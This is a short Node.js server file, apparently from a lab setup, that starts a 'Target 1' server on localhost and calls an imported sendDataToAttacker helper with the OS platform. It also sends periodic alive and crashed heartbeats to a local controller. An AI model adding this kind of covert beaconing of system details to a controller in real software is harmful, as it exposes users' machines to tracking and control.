import { createServer } from "node:http";
import sendDataToAttacker from "./utils/sendDataToAttacker.js";
import os from "os";
import app from "./index.js";
import axios from "axios";
const server = createServer(app);

const host = "127.0.0.1";
const port = 5050;
sendDataToAttacker(os.platform(), host, port);
server.listen(port, host, () => {
  console.log(`[🔥] Target 1 is listening on ${host}:${port}...`);
});
setInterval(() => {
  try {
    axios.post("http://127.0.0.1:3000/target/fetch-signal", {
      host,
      port,
      status: "Alive",
    });
  } catch (error) {
    process.exit(1);
  }
}, 5000);

process.on("exit", (code) => {
  axios.post("http://127.0.0.1:3000/target/fetch-signal", {
    host,
    port,
    status: "Crashed",
  });
});
